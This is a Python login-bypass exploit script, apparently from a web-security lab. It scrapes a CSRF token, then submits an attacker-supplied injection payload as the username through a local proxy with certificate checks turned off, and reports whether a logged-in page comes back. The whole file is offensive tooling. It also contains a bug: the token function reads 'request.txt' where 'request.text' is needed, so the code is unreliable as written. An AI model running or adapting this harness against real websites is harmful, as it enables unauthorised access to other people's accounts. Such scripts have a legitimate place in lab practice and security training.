import bs4
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def token(session, url):
    request = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(request.txt, 'html.parser')
    search = soup.find("input")
    csrf = search.get("value") if search else None
    return csrf

def exploit(session, url, payload):
    csrf = token(session, url)
    data = {"csrf": csrf,
        "username": payload,
        "password": "nil"}
    request = session.post(url , data=data, verify=False, proxies=proxies)
    response = request.text
    if "Log out" in response:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = str(sys.argv[1].strip())
        payload = str(sys.argv[2].strip())
    except IndexError:
        print(f"[!] syntax-error: {sys.argv[0]} <url> <payload>")
        sys.exit(1)

    session = requests.Session()
    if exploit(session, url, payload):
        print("[+] status: success")
    else:
        print("[-] status: failure")
